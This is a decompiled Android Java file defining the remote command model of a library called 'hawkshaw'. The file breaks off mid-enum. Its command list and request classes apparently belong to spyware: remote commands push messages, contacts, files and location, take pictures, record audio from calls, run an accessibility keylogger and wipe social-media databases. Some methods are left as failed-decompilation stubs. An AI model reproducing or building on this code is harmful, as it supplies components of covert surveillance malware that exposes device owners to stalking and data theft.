package com.hawkshaw.library.datalayer.models;

import B3.f;
import D3.b;
import E3.C0020d;
import E3.O;
import E3.U;
import E3.q0;
import E3.u0;
import W2.e;
import Y1.C0110h;
import Y1.K;
import androidx.core.app.NotificationCompat;
import com.hawkshaw.library.datalayer.network.twirp.CommandTypeSerializer;
import d3.C0393a;
import java.util.List;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import p3.q;
import w3.w;

@f
public final class Command {
    public static final Companion Companion = new Companion((j3.f) null);
    private final AccessibilityCommandRequest accessibilityCommandRequest;
    private final AddCallLogRequest addCallLogRequest;
    private final AddContactRequest addContactRequest;
    private final CancelScheduledCommandRequest cancelScheduledCommandRequest;
    private final DeleteCallLogRequest deleteCallLogRequest;
    private final DeleteContactRequest deleteContactRequest;
    private final DeleteFileRequest deleteFileRequest;
    private final DeletePendingPushFilesRequest deletePendingPushFilesRequest;
    private final PushDeviceInfoRequest deviceInfoRequest;
    private final FileRequest fileRequest;
    private final FilesRequest filesRequest;
    private final FlashRequest flashRequest;
    private final GetLocationRequest getLocationRequest;
    private final LoginRequest loginRequest;
    private final MakeCallRequest makeCallRequest;
    private final OpenAppRequest openAppRequest;
    private final OpenDeeplinkRequest openDeeplinkRequest;
    private final RecordAudioRequest recordAudioRequest;
    private final RecordVideoRequest recordVideoRequest;
    private final ScheduleCommandRequest scheduleCommandRequest;
    private final SendMessageRequest sendMessageRequest;
    private final long sentTime;
    private final DeviceAudioRequest setDeviceAudioRequest;
    private final SetDynamicConfigRequest setDynamicConfigRequest;
    private final StartRepeatPushDataRequest startRepeatPushDataRequest;
    private final SyncAppConfigRequest syncAppConfigRequest;
    private final TakePictureRequest takePictureRequest;
    private final ThumbnailRequest thumbnailRequest;
    private final CommandType type;
    private final VibrateRequest vibrateRequest;

    @f(with = CommandTypeSerializer.class)
    public enum CommandType {
        Unknown,
        Login,
        PushTokens,
        PushData,
        StartRepeatPushData,
        StopRepeatPushData,
        SyncAppConfig,
        PushCallLogs,
        AddCallLog,
        DeleteCallLog,
        PushContacts,
        AddContact,
        DeleteContact,
        PushMessages,
        SendMessage,
        PushFileExplorerWalk,
        PushThumbnails,
        DeleteFile,
        PushFile,
        PushFiles,
        GetPendingPushFiles,
        DeletePendingPushFiles,
        SyncPushFiles,
        PushLocation,
        Vibrate,
        Flash,
        TakePicture,
        RecordVideo,
        RecordAudio,
        PushInstalledAppList,
        PushAppLogs,
        PushDeviceInfo,
        OpenApp,
        MakeCall,
        OpenDeeplink,
        GetDiagnosis,
        ScheduleCommand,
        CancelScheduledCommand,
        StartInitializer,
        ConnectSocket,
        DisconnectSocket,
        RunAccessibilityCommand,
        PushAccessibilityKeylogger,
        PushAccessibilityNotifications,
        PushAccessibilitySocialMedia,
        AccessibilityNukeSocialMediaDatabase,
        SetDeviceAudio,
        PushDeviceAudio,
        SetDynamicConfig,
        PushDynamicConfig;
        
        /* access modifiers changed from: private */
        public static final e $cachedSerializer$delegate = null;
        public static final Companion Companion = null;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            private final /* synthetic */ KSerializer get$cachedSerializer() {
                return (KSerializer) CommandType.$cachedSerializer$delegate.getValue();
            }

            public final KSerializer serializer() {
                return get$cachedSerializer();
            }
        }

        static {
            CommandType[] $values;
            $ENTRIES = K.J($values);
            Companion = new Companion((j3.f) null);
            $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, c.f4887D);
        }

        public static C0393a getEntries() {
            return $ENTRIES;
        }
    }

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return Command$$serializer.INSTANCE;
        }
    }

    @f
    public static final class DeviceAudioRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {RingerMode.Companion.serializer(), null, null, null, null};
        public static final Companion Companion = new Companion((j3.f) null);
        private final int alarmVolume;
        private final int callVolume;
        private final int musicVolume;
        private final int ringVolume;
        private final RingerMode ringerMode;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$DeviceAudioRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum RingerMode {
            Unknown,
            Normal,
            Silent,
            Vibrate;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) RingerMode.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                RingerMode[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, d.f4888D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public DeviceAudioRequest() {
            this((RingerMode) null, 0, 0, 0, 0, 31, (j3.f) null);
        }

        public static /* synthetic */ void getAlarmVolume$annotations() {
        }

        public static /* synthetic */ void getCallVolume$annotations() {
        }

        public static /* synthetic */ void getMusicVolume$annotations() {
        }

        public static /* synthetic */ void getRingVolume$annotations() {
        }

        public static /* synthetic */ void getRingerMode$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(DeviceAudioRequest deviceAudioRequest, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            if (bVar.q(serialDescriptor) || deviceAudioRequest.ringerMode != RingerMode.Unknown) {
                ((q) bVar).e0(serialDescriptor, 0, kSerializerArr[0], deviceAudioRequest.ringerMode);
            }
            if (bVar.q(serialDescriptor) || deviceAudioRequest.musicVolume != -1) {
                ((q) bVar).c0(1, deviceAudioRequest.musicVolume, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || deviceAudioRequest.ringVolume != -1) {
                ((q) bVar).c0(2, deviceAudioRequest.ringVolume, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || deviceAudioRequest.callVolume != -1) {
                ((q) bVar).c0(3, deviceAudioRequest.callVolume, serialDescriptor);
            }
            if (bVar.q(serialDescriptor) || deviceAudioRequest.alarmVolume != -1) {
                ((q) bVar).c0(4, deviceAudioRequest.alarmVolume, serialDescriptor);
            }
        }

        public final int getAlarmVolume() {
            return this.alarmVolume;
        }

        public final int getCallVolume() {
            return this.callVolume;
        }

        public final int getMusicVolume() {
            return this.musicVolume;
        }

        public final int getRingVolume() {
            return this.ringVolume;
        }

        public final RingerMode getRingerMode() {
            return this.ringerMode;
        }

        /* JADX WARNING: Illegal instructions before constructor call */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public /* synthetic */ DeviceAudioRequest(com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest.RingerMode r4, int r5, int r6, int r7, int r8, int r9, j3.f r10) {
            
                r3 = this;
                r10 = r9 & 1
                if (r10 == 0) goto L_0x0006
                com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$RingerMode r4 = com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest.RingerMode.Unknown
            L_0x0006:
                r10 = r9 & 2
                r0 = -1
                if (r10 == 0) goto L_0x000d
                r10 = r0
                goto L_0x000e
            L_0x000d:
                r10 = r5
            L_0x000e:
                r5 = r9 & 4
                if (r5 == 0) goto L_0x0014
                r1 = r0
                goto L_0x0015
            L_0x0014:
                r1 = r6
            L_0x0015:
                r5 = r9 & 8
                if (r5 == 0) goto L_0x001b
                r2 = r0
                goto L_0x001c
            L_0x001b:
                r2 = r7
            L_0x001c:
                r5 = r9 & 16
                if (r5 == 0) goto L_0x0021
                goto L_0x0022
            L_0x0021:
                r0 = r8
            L_0x0022:
                r5 = r3
                r6 = r4
                r7 = r10
                r8 = r1
                r9 = r2
                r10 = r0
                r5.<init>(r6, r7, r8, r9, r10)
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.DeviceAudioRequest.<init>(com.hawkshaw.library.datalayer.models.Command$DeviceAudioRequest$RingerMode, int, int, int, int, int, j3.f):void");
        }

        public /* synthetic */ DeviceAudioRequest(int i5, RingerMode ringerMode2, int i6, int i7, int i8, int i9, q0 q0Var) {
            this.ringerMode = (i5 & 1) == 0 ? RingerMode.Unknown : ringerMode2;
            if ((i5 & 2) == 0) {
                this.musicVolume = -1;
            } else {
                this.musicVolume = i6;
            }
            if ((i5 & 4) == 0) {
                this.ringVolume = -1;
            } else {
                this.ringVolume = i7;
            }
            if ((i5 & 8) == 0) {
                this.callVolume = -1;
            } else {
                this.callVolume = i8;
            }
            if ((i5 & 16) == 0) {
                this.alarmVolume = -1;
            } else {
                this.alarmVolume = i9;
            }
        }

        public DeviceAudioRequest(RingerMode ringerMode2, int i5, int i6, int i7, int i8) {
            K.n(ringerMode2, "ringerMode");
            this.ringerMode = ringerMode2;
            this.musicVolume = i5;
            this.ringVolume = i6;
            this.callVolume = i7;
            this.alarmVolume = i8;
        }
    }

    @f
    public static final class GetLocationRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {Priority.Companion.serializer(), null, null, null, null, null};
        public static final Companion Companion = new Companion((j3.f) null);
        private final long expirationDuration;
        private final long fastestInterval;
        private final long interval;
        private final int mPriority;
        private final Priority priority;
        private final float smallestDisplacement;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$GetLocationRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum Priority {
            PRIORITY_HIGH_ACCURACY,
            PRIORITY_BALANCED_POWER_ACCURACY,
            PRIORITY_LOW_POWER,
            PRIORITY_PASSIVE;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) Priority.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                Priority[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, h.f4892D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public /* synthetic */ class WhenMappings {
            public static final /* synthetic */ int[] $EnumSwitchMapping$0;
           static {
                
                    com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$Priority[] r0 = com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.Priority.values()
                    int r0 = r0.length
                    int[] r0 = new int[r0]
                    com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$Priority r1 = com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.Priority.PRIORITY_HIGH_ACCURACY     // Catch:{ NoSuchFieldError -> 0x0010 }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                    r2 = 1
                    r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
                L_0x0010:
                    com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$Priority r1 = com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.Priority.PRIORITY_BALANCED_POWER_ACCURACY     // Catch:{ NoSuchFieldError -> 0x0019 }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                    r2 = 2
                    r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
                L_0x0019:
                    com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$Priority r1 = com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.Priority.PRIORITY_LOW_POWER     // Catch:{ NoSuchFieldError -> 0x0022 }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                    r2 = 3
                    r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
                L_0x0022:
                    com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$Priority r1 = com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.Priority.PRIORITY_PASSIVE     // Catch:{ NoSuchFieldError -> 0x002b }
                    int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                    r2 = 4
                    r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
                L_0x002b:
                    $EnumSwitchMapping$0 = r0
                    return
                
                throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.WhenMappings.<clinit>():void");
            }
        }

        public GetLocationRequest() {
            this((Priority) null, 0, 0, 0, 0.0f, 31, (j3.f) null);
        }

        public static /* synthetic */ void getExpirationDuration$annotations() {
        }

        public static /* synthetic */ void getFastestInterval$annotations() {
        }

        public static /* synthetic */ void getInterval$annotations() {
        }

        private static /* synthetic */ void getPriority$annotations() {
        }

        public static /* synthetic */ void getSmallestDisplacement$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(GetLocationRequest getLocationRequest, b bVar, SerialDescriptor serialDescriptor) {
            int i5;
            KSerializer[] kSerializerArr = $childSerializers;
            if (bVar.q(serialDescriptor) || getLocationRequest.priority != Priority.PRIORITY_PASSIVE) {
                ((q) bVar).e0(serialDescriptor, 0, kSerializerArr[0], getLocationRequest.priority);
            }
            if (bVar.q(serialDescriptor) || getLocationRequest.interval != 30000) {
                ((q) bVar).d0(serialDescriptor, 1, getLocationRequest.interval);
            }
            if (bVar.q(serialDescriptor) || getLocationRequest.fastestInterval != 5000) {
                ((q) bVar).d0(serialDescriptor, 2, getLocationRequest.fastestInterval);
            }
            if (bVar.q(serialDescriptor) || getLocationRequest.expirationDuration != 600000) {
                ((q) bVar).d0(serialDescriptor, 3, getLocationRequest.expirationDuration);
            }
            if (bVar.q(serialDescriptor) || Float.compare(getLocationRequest.smallestDisplacement, 5.0f) != 0) {
                ((q) bVar).a0(serialDescriptor, 4, getLocationRequest.smallestDisplacement);
            }
            if (!bVar.q(serialDescriptor)) {
                int i6 = getLocationRequest.mPriority;
                int i7 = WhenMappings.$EnumSwitchMapping$0[getLocationRequest.priority.ordinal()];
                if (i7 == 1) {
                    i5 = 100;
                } else if (i7 == 2) {
                    i5 = 102;
                } else if (i7 == 3) {
                    i5 = 104;
                } else if (i7 == 4) {
                    i5 = 105;
                } else {
                    throw new RuntimeException();
                }
                if (i6 == i5) {
                    return;
                }
            }
            ((q) bVar).c0(5, getLocationRequest.mPriority, serialDescriptor);
        }

        public final long getExpirationDuration() {
            return this.expirationDuration;
        }

        public final long getFastestInterval() {
            return this.fastestInterval;
        }

        public final long getInterval() {
            return this.interval;
        }

        public final int getMPriority() {
            return this.mPriority;
        }

        public final float getSmallestDisplacement() {
            return this.smallestDisplacement;
        }

        /* JADX WARNING: Illegal instructions before constructor call */
        /* Code decompiled incorrectly, please refer to instructions dump. */
        public /* synthetic */ GetLocationRequest(com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.Priority r9, long r10, long r12, long r14, float r16, int r17, j3.f r18) {
            
                r8 = this;
                r0 = r17 & 1
                if (r0 == 0) goto L_0x0007
                com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$Priority r0 = com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.Priority.PRIORITY_PASSIVE
                goto L_0x0008
            L_0x0007:
                r0 = r9
            L_0x0008:
                r1 = r17 & 2
                if (r1 == 0) goto L_0x000f
                r1 = 30000(0x7530, double:1.4822E-319)
                goto L_0x0010
            L_0x000f:
                r1 = r10
            L_0x0010:
                r3 = r17 & 4
                if (r3 == 0) goto L_0x0017
                r3 = 5000(0x1388, double:2.4703E-320)
                goto L_0x0018
            L_0x0017:
                r3 = r12
            L_0x0018:
                r5 = r17 & 8
                if (r5 == 0) goto L_0x0020
                r5 = 600000(0x927c0, double:2.964394E-318)
                goto L_0x0021
            L_0x0020:
                r5 = r14
            L_0x0021:
                r7 = r17 & 16
                if (r7 == 0) goto L_0x0028
                r7 = 1084227584(0x40a00000, float:5.0)
                goto L_0x002a
            L_0x0028:
                r7 = r16
            L_0x002a:
                r9 = r8
                r10 = r0
                r11 = r1
                r13 = r3
                r15 = r5
                r17 = r7
                r9.<init>(r10, r11, r13, r15, r17)
                return
            
            throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.GetLocationRequest.<init>(com.hawkshaw.library.datalayer.models.Command$GetLocationRequest$Priority, long, long, long, float, int, j3.f):void");
        }

        public /* synthetic */ GetLocationRequest(int i5, Priority priority2, long j5, long j6, long j7, float f5, int i6, q0 q0Var) {
            int i7;
            this.priority = (i5 & 1) == 0 ? Priority.PRIORITY_PASSIVE : priority2;
            if ((i5 & 2) == 0) {
                this.interval = 30000;
            } else {
                this.interval = j5;
            }
            if ((i5 & 4) == 0) {
                this.fastestInterval = 5000;
            } else {
                this.fastestInterval = j6;
            }
            if ((i5 & 8) == 0) {
                this.expirationDuration = 600000;
            } else {
                this.expirationDuration = j7;
            }
            if ((i5 & 16) == 0) {
                this.smallestDisplacement = 5.0f;
            } else {
                this.smallestDisplacement = f5;
            }
            if ((i5 & 32) == 0) {
                int i8 = WhenMappings.$EnumSwitchMapping$0[this.priority.ordinal()];
                if (i8 == 1) {
                    i7 = 100;
                } else if (i8 == 2) {
                    i7 = 102;
                } else if (i8 == 3) {
                    i7 = 104;
                } else if (i8 == 4) {
                    i7 = 105;
                } else {
                    throw new RuntimeException();
                }
                this.mPriority = i7;
                return;
            }
            this.mPriority = i6;
        }

        public GetLocationRequest(Priority priority2, long j5, long j6, long j7, float f5) {
            int i5;
            K.n(priority2, "priority");
            this.priority = priority2;
            this.interval = j5;
            this.fastestInterval = j6;
            this.expirationDuration = j7;
            this.smallestDisplacement = f5;
            int i6 = WhenMappings.$EnumSwitchMapping$0[priority2.ordinal()];
            if (i6 == 1) {
                i5 = 100;
            } else if (i6 == 2) {
                i5 = 102;
            } else if (i6 == 3) {
                i5 = 104;
            } else if (i6 == 4) {
                i5 = 105;
            } else {
                throw new RuntimeException();
            }
            this.mPriority = i5;
        }
    }

    @f
    public static final class PushDeviceInfoRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {Type.Companion.serializer()};
        public static final Companion Companion = new Companion((j3.f) null);
        private final Type type;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return Command$PushDeviceInfoRequest$$serializer.INSTANCE;
            }
        }

        @f
        public enum Type {
            All,
            Dynamic,
            Static;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) Type.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            static {
                Type[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, i.f4893D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }
        }

        public PushDeviceInfoRequest() {
            this((Type) null, 1, (j3.f) null);
        }

        public static /* synthetic */ void getType$annotations() {
        }

        public static final /* synthetic */ void write$Self$library_release(PushDeviceInfoRequest pushDeviceInfoRequest, b bVar, SerialDescriptor serialDescriptor) {
            KSerializer[] kSerializerArr = $childSerializers;
            if (bVar.q(serialDescriptor) || pushDeviceInfoRequest.type != Type.All) {
                ((q) bVar).e0(serialDescriptor, 0, kSerializerArr[0], pushDeviceInfoRequest.type);
            }
        }

        public final Type getType() {
            return this.type;
        }

        /* JADX INFO: this call moved to the top of the method (can break code semantics) */
        public /* synthetic */ PushDeviceInfoRequest(Type type2, int i5, j3.f fVar) {
            this((i5 & 1) != 0 ? Type.All : type2);
        }

        public /* synthetic */ PushDeviceInfoRequest(int i5, Type type2, q0 q0Var) {
            if ((i5 & 1) == 0) {
                this.type = Type.All;
            } else {
                this.type = type2;
            }
        }

        public PushDeviceInfoRequest(Type type2) {
            K.n(type2, "type");
            this.type = type2;
        }
    }

    @f
    public static final class RecordAudioRequest {
        /* access modifiers changed from: private */
        public static final KSerializer[] $childSerializers = {null, null, AudioEncoderEnum.Companion.serializer(), AudioSourceEnum.Companion.serializer(), OutputFormatEnum.Companion.serializer(), null, null, null};
        public static final Companion Companion = new Companion((j3.f) null);
        private final int audioBitRate;
        private final int audioChannelCount;
        private final AudioEncoderEnum audioEncoder;
        private final int audioSampleRate;
        private final AudioSourceEnum audioSource;
        private final long duration;
        private final OutputFormatEnum outputFormat;
        private final boolean saveToPrivate;

        @f
        public enum AudioEncoderEnum {
            DEFAULT,
            AMR_NB,
            AMR_WB,
            AAC,
            HE_AAC,
            AAC_ELD,
            VORBIS,
            OPUS;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) AudioEncoderEnum.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            public /* synthetic */ class WhenMappings {
                public static final /* synthetic */ int[] $EnumSwitchMapping$0 = null;
                static {
                    
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum[] r0 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.values()
                        int r0 = r0.length
                        int[] r0 = new int[r0]
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.DEFAULT     // Catch:{ NoSuchFieldError -> 0x0010 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                        r2 = 1
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
                    L_0x0010:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.AMR_NB     // Catch:{ NoSuchFieldError -> 0x0019 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                        r2 = 2
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
                    L_0x0019:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.AMR_WB     // Catch:{ NoSuchFieldError -> 0x0022 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                        r2 = 3
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
                    L_0x0022:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.AAC     // Catch:{ NoSuchFieldError -> 0x002b }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                        r2 = 4
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
                    L_0x002b:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.HE_AAC     // Catch:{ NoSuchFieldError -> 0x0034 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0034 }
                        r2 = 5
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0034 }
                    L_0x0034:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.AAC_ELD     // Catch:{ NoSuchFieldError -> 0x003d }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x003d }
                        r2 = 6
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x003d }
                    L_0x003d:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.VORBIS     // Catch:{ NoSuchFieldError -> 0x0046 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0046 }
                        r2 = 7
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0046 }
                    L_0x0046:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioEncoderEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.OPUS     // Catch:{ NoSuchFieldError -> 0x0050 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0050 }
                        r2 = 8
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0050 }
                    L_0x0050:
                        $EnumSwitchMapping$0 = r0
                        return
                    
                    throw new UnsupportedOperationException("Method not decompiled: com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioEncoderEnum.WhenMappings.<clinit>():void");
                }
            }

            static {
                AudioEncoderEnum[] $values;
                $ENTRIES = K.J($values);
                Companion = new Companion((j3.f) null);
                $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, j.f4894D);
            }

            public static C0393a getEntries() {
                return $ENTRIES;
            }

            public final int toAudioEncoder() {
                switch (WhenMappings.$EnumSwitchMapping$0[ordinal()]) {
                    case 1:
                        return 0;
                    case 2:
                        return 1;
                    case 3:
                        return 2;
                    case 4:
                        return 3;
                    case 5:
                        return 4;
                    case 6:
                        return 5;
                    case 7:
                        return 6;
                    case 8:
                        return 7;
                    default:
                        throw new RuntimeException();
                }
            }
        }

        @f
        public enum AudioSourceEnum {
            DEFAULT,
            MIC,
            VOICE_UPLINK,
            VOICE_DOWNLINK,
            VOICE_CALL,
            CAMCORDER,
            VOICE_RECOGNITION,
            VOICE_COMMUNICATION,
            UNPROCESSED,
            VOICE_PERFORMANCE;
            
            /* access modifiers changed from: private */
            public static final e $cachedSerializer$delegate = null;
            public static final Companion Companion = null;

            public static final class Companion {
                private Companion() {
                }

                public /* synthetic */ Companion(j3.f fVar) {
                    this();
                }

                private final /* synthetic */ KSerializer get$cachedSerializer() {
                    return (KSerializer) AudioSourceEnum.$cachedSerializer$delegate.getValue();
                }

                public final KSerializer serializer() {
                    return get$cachedSerializer();
                }
            }

            public /* synthetic */ class WhenMappings {
                public static final /* synthetic */ int[] $EnumSwitchMapping$0 = null;
                static {
                    
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum[] r0 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.values()
                        int r0 = r0.length
                        int[] r0 = new int[r0]
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.DEFAULT     // Catch:{ NoSuchFieldError -> 0x0010 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0010 }
                        r2 = 1
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0010 }
                    L_0x0010:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.MIC     // Catch:{ NoSuchFieldError -> 0x0019 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0019 }
                        r2 = 2
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0019 }
                    L_0x0019:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.VOICE_UPLINK     // Catch:{ NoSuchFieldError -> 0x0022 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0022 }
                        r2 = 3
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0022 }
                    L_0x0022:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.VOICE_DOWNLINK     // Catch:{ NoSuchFieldError -> 0x002b }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x002b }
                        r2 = 4
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x002b }
                    L_0x002b:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.VOICE_CALL     // Catch:{ NoSuchFieldError -> 0x0034 }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x0034 }
                        r2 = 5
                        r0[r1] = r2     // Catch:{ NoSuchFieldError -> 0x0034 }
                    L_0x0034:
                        com.hawkshaw.library.datalayer.models.Command$RecordAudioRequest$AudioSourceEnum r1 = com.hawkshaw.library.datalayer.models.Command.RecordAudioRequest.AudioSourceEnum.CAMCORDER     // Catch:{ NoSuchFieldError -> 0x003d }
                        int r1 = r1.ordinal()     // Catch:{ NoSuchFieldError -> 0x003d }
                        r2 = 6
